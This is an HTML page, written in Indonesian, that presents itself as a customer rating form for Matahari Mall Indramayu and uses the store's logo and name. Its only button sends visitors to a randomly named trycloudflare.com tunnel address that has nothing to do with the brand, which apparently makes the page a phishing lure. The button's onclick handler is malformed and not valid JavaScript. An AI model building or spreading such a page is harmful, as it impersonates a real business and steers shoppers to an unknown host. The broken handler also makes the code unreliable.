<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Rating Pengunjung - Matahari Mall Indramayu</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Beri penilaian atas pengalaman Anda di Matahari Mall Indramayu.">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(to bottom, #ffffff, #fdf2ec);
      color: #333;
      padding: 20px;
      text-align: center;
    }

    header {
      padding: 20px 0;
    }

    header img {
      width: 100px;
      margin-bottom: 10px;
    }

    h1 {
      font-size: 24px;
      color: #c0392b;
    }

    p {
      font-size: 16px;
      margin: 15px 0;
    }

    .button-container {
      margin-top: 30px;
    }

    button {
      background-color: #c0392b;
      color: white;
      border: none;
      padding: 15px 30px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #e74c3c;
    }

    footer {
      margin-top: 40px;
      font-size: 12px;
      color: #888;
    }

    @media (max-width: 600px) {
      h1 {
        font-size: 20px;
      }

      button {
        width: 80%;
        font-size: 18px;
      }
    }
  </style>
</head>
<body>
  <header>
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6e/Matahari_Department_Store_logo.svg/2560px-Matahari_Department_Store_logo.svg.png" alt="Matahari Logo">
    <h1>Matahari Mall Indramayu</h1>
  </header>

  <main>
    <p>Terima kasih telah mengunjungi Matahari Mall Indramayu!</p>
    <p>Silakan beri penilaian Anda terhadap pengalaman berbelanja hari ini.</p>

    <div class="button-container">
      <button onclick="https://charity-julian-tomorrow-respiratory.trycloudflare.com';">
        Beri Penilaian Sekarang
      </button>
    </div>
  </main>

  <footer>
    &copy; 2025 Matahari Mall Indramayu. Hak cipta dilindungi.
  </footer>
</body>
</html>
